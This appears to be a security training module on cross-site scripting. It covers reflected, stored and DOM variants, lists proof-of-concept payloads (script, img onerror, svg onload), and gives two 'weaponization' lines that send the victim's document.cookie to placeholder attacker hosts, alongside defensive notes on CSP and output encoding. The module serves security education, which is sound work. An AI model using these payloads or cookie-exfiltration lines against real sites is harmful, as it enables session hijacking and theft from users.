# Cross-Site Scripting (XSS) Fundamentals

## 1. Orientation

### What this module covers
This module covers **XSS**. Executing malicious JavaScript in *someone else's* browser.

### Fit in the Learning Path
XSS is the most common web vulnerability. It allows you to steal Session Cookies, redirect users, or deface websites.

### Learning Objectives
By the end of this module, you should understand:
*   **Reflected** vs **Stored** vs **DOM** XSS.
*   The impact (It's not just `<script>alert(1)</script>`).
*   **BeEF** (Browser Exploitation Framework).

---

## 2. Core Content

### The Mechanism
The server takes your input and puts it into the HTML of the page.
Input: `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`
The victim visits the page. Their browser executes the script. Their cookie is sent to you.

### Types
1.  **Reflected**: The payload is in the URL. You must trick the victim into clicking a link.
    *   `site.com?search=<script>...`
2.  **Stored (Persistent)**: The payload is saved in the DB (e.g., a Comment).
    *   *Danger*: Everyone who views the comment gets hacked. No link clicking needed.
3.  **DOM**: The payload exists only in the client-side JavaScript logic.

---

## 3. Guided Practice

### The Proof of Concept (PoC)
**Goal**: Make a popup box appear.

**Payload 1**:
`<script>alert('XSS')</script>`
*   Standard.

**Payload 2 (Img Tag)**:
`<img src=x onerror=alert(1)>`
*   Use this if `<script>` is blocked.

**Payload 3 (SVG)**:
`<svg/onload=alert(1)>`

### Weaponization
Change `alert(1)` to `document.location='http://attacker.com/steal?c='+document.cookie`.
Now you have their session.

---

## 4. Reflection Check

1.  **Scope**: Does XSS affect the *Server*? (No. It affects the *Client*. But stealing the Admin's cookie allows you to attack the Server).
2.  **Defense**: Content Security Policy (CSP). How does it help? (A header that tells the browser "Only load scripts from `mysite.com`. Ignore everything else").
3.  **Sanitization**: Should you format output as Text or HTML? (Text. If you render user input as HTML, you get XSS).

---

## 5. Completion Criteria

This module is complete when:
1.  You can distinct between Reflected and Stored XSS.
2.  You understand that `alert(1)` is just the testing flag, not the attack.
3.  You know that XSS targets the *User*, not the Database.
